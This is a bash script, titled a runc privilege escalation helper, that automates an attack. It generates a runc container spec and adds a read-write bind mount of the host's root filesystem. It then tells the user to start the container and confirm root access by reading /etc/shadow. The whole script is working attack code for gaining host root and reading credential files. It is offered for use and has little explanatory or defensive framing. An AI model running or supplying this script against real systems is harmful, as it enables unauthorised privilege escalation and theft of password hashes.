#!/bin/bash
# Runc Privilege Escalation Helper Script
# Automates the setup of runc container with host root mount

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}[*] Runc Privilege Escalation Setup${NC}"
echo ""

# Check if runc is installed
if ! command -v runc &> /dev/null; then
    echo -e "${RED}[!] runc is not installed on this system${NC}"
    echo "    Try: apt install runc || yum install runc"
    exit 1
fi

echo -e "${GREEN}[+] runc is installed${NC}"

# Generate the spec file
echo -e "${YELLOW}[*] Generating container specification...${NC}"
runc spec

if [ ! -f "config.json" ]; then
    echo -e "${RED}[!] Failed to create config.json${NC}"
    exit 1
fi

echo -e "${GREEN}[+] config.json created${NC}"

# Check if jq is available for JSON manipulation
if command -v jq &> /dev/null; then
    echo -e "${YELLOW}[*] Modifying config.json to mount host root...${NC}"
    
    # Add the bind mount for host root filesystem
    jq '.mounts += [{
        "type": "bind",
        "source": "/",
        "destination": "/",
        "options": ["rbind", "rw", "rprivate"]
    }]' config.json > config.json.tmp && mv config.json.tmp config.json
    
    echo -e "${GREEN}[+] config.json modified with host mount${NC}"
else
    echo -e "${YELLOW}[!] jq not found - manual modification required${NC}"
    echo ""
    echo "Add this to the 'mounts' array in config.json:"
    echo ""
    echo '{'
    echo '    "type": "bind",'
    echo '    "source": "/",'
    echo '    "destination": "/",'
    echo '    "options": ['
    echo '        "rbind",'
    echo '        "rw",'
    echo '        "rprivate"'
    echo '    ]'
    echo '}'
    echo ""
    echo -e "${YELLOW}[*] Please edit config.json manually and press Enter when done...${NC}"
    read -p ""
fi

# Create rootfs directory
echo -e "${YELLOW}[*] Creating rootfs directory...${NC}"
mkdir -p rootfs

echo -e "${GREEN}[+] Setup complete!${NC}"
echo ""
echo -e "${GREEN}Next steps:${NC}"
echo "  1. Run: runc run demo"
echo "  2. You'll have access to the host's root filesystem"
echo "  3. Verify with: cat /etc/shadow"
echo ""
echo -e "${YELLOW}To cleanup after use:${NC}"
echo "  runc delete demo"
echo "  rm -rf config.json rootfs"
